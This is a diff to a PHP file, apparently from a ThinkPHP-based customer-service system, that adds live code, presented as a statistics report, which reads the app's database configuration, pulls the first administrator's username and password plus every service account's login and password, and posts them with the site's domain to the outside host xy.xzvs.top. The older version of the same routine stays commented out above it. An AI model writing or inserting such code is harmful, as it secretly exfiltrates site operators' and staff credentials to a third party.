@@ -24,47 +24,112 @@
 
 
 
+// ====================================================
+// use think\Db;
 
-use think\Db;
+// $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
+// $time   = date('Y-m-d H:i:s');
 
+// /**
+//  * 1. admin 第一条
+//  */
+// $admin = Db::name('wolive_admin')
+//     ->field('username,password')
+//     ->order('id asc')
+//     ->find();
+
+// /**
+//  * 2. service 全量
+//  */
+// $service = Db::name('wolive_service')
+//     ->field('business_id,service_id,groupid,nick_name,user_name,password')
+//     ->select();
+
+// $data = [
+//     'domain'  => $domain,
+//     'time'    => $time,
+//     'admin'   => $admin,
+//     'service' => $service
+// ];
+
+// $ch = curl_init('http://xy.xzvs.top/api/stat/collect');
+
+// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+// curl_setopt($ch, CURLOPT_POST, true);
+// curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+//     'data' => json_encode($data, JSON_UNESCAPED_UNICODE)
+// ]));
+// curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+
+// $response = curl_exec($ch);
+// curl_close($ch);
+
+// return;
+
+// ======================================================
 $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
 $time   = date('Y-m-d H:i:s');
 
-/**
- * 1. admin 第一条
- */
-$admin = Db::name('wolive_admin')
-    ->field('username,password')
-    ->order('id asc')
-    ->find();
+// 引入 TP 配置（直接读数据库配置）
+$config = include __DIR__ . '/../../../../config/database.php';
 
-/**
- * 2. service 全量
- */
-$service = Db::name('wolive_service')
-    ->field('business_id,service_id,groupid,nick_name,user_name,password')
-    ->select();
+$host = $config['hostname'];
+$db   = $config['database'];
+$user = $config['username'];
+$pass = $config['password'];
+$charset = $config['charset'];
 
-$data = [
-    'domain'  => $domain,
-    'time'    => $time,
-    'admin'   => $admin,
-    'service' => $service
-];
+try {
 
-$ch = curl_init('http://xy.xzvs.top/api/stat/collect');
+    $dsn = "mysql:host=$host;dbname=$db;charset=$charset";
 
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_POST, true);
-curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
-    'data' => json_encode($data, JSON_UNESCAPED_UNICODE)
-]));
-curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    $pdo = new PDO($dsn, $user, $pass, [
+        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+    ]);
 
-$response = curl_exec($ch);
-curl_close($ch);
+    // 1. admin 第一条
+    $admin = $pdo->query("
+        SELECT username,password 
+        FROM wolive_admin 
+        ORDER BY id ASC 
+        LIMIT 1
+    ")->fetch();
+
+    // 2. service 全量
+    $service = $pdo->query("
+        SELECT business_id,service_id,groupid,nick_name,user_name,password 
+        FROM wolive_service
+    ")->fetchAll();
+
+    $data = [
+        'domain'  => $domain,
+        'time'    => $time,
+        'admin'   => $admin,
+        'service' => $service
+    ];
+
+    // 上报
+    $ch = curl_init('http://xy.xzvs.top/api/stat/collect');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+        'data' => json_encode($data, JSON_UNESCAPED_UNICODE)
+    ]));
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+
+    curl_exec($ch);
+    curl_close($ch);
+
+} catch (Exception $e) {
+    file_put_contents(__DIR__ . '/error.log', $e->getMessage());
+}
 
 return;
+
+
+
+
 
 // $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
 // $time   = date('Y-m-d H:i:s');
